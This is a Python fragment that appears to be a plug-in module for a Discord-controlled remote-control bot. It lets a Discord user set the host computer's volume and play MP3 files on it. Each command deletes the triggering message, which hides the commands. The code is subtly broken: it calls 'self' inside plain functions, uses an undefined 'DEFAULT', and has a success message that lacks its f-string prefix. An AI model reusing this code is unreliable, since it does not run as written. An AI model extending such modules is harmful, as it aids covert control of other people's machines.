#<imports>
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pygame
import threading
#</imports>


@client.command(name='volume')
async def volume_control(ctx, volume_int=None):
    await ctx.message.delete()
    if volume_int != None:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))

        try: volume_int = int(volume_int)
        except:
            return await ctx.send(embed=self.generate_embed(
                title='📛 Error',
                description='```Syntax: .volume <0 - 100>```',
                color=0xff0000,
                footer=['Please ⭐ our repository if you enjoy'],
                author=[DEFAULT, DEFAULT]))

        if volume_int <= 100 and volume_int >= 0:
            volume.SetMasterVolumeLevelScalar(volume_int/100, None)
            await ctx.send(embed=self.generate_embed(
                title='🟢 Success',
                description='```Successfully set volume to {volume_int}%```',
                color=0x00ff00,
                footer=['Please ⭐ our repository if you enjoy'],
                author=[DEFAULT, DEFAULT]))
        else:
            await ctx.send(embed=self.generate_embed(
                title='📛 Error',
                description='```Syntax: .volume <0 - 100>```',
                color=0xff0000,
                footer=['Please ⭐ our repository if you enjoy'],
                author=[DEFAULT, DEFAULT]))
    else:
        await ctx.send(embed=self.generate_embed(
            title='📛 Error',
            description='```Syntax: .volume <0 - 100>```',
            color=0xff0000,
            footer=['Please ⭐ our repository if you enjoy'],
            author=[DEFAULT, DEFAULT]))

@client.command(name='play')
async def play_audio(ctx, audio_file=None):
    await ctx.message.delete()
    if audio_file == None:
        await ctx.send(embed=self.generate_embed(
            title='📛 Error',
            description='```Syntax: .play <path/to/audio-file.mp3>```',
            color=0xff0000,
            footer=['Please ⭐ our repository if you enjoy'],
            author=[DEFAULT, DEFAULT]))
    elif not ctx.message.content.endswith('.mp3'):
        await ctx.send(embed=self.generate_embed(
            title='📛 Error',
            description='```Invalid file type. Please select an MP3 file.```',
            color=0xff0000,
            footer=['Please ⭐ our repository if you enjoy'],
            author=[DEFAULT, DEFAULT]))
    else:
        def play_audio():
            audio_file = ctx.message.content[6:]
            audio_file = audio_file.replace('\\','/')
            pygame.mixer.init()
            pygame.mixer.music.load(audio_file)
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                pass
            pygame.mixer.quit()
        threading.Thread(target=play_audio).start()
        await ctx.send(embed=self.generate_embed(
            title='🟢 Success',
            description='```Successfully started playing audio file.```',
            color=0x00ff00,
            footer=['Please ⭐ our repository if you enjoy'],
            author=[DEFAULT, DEFAULT]))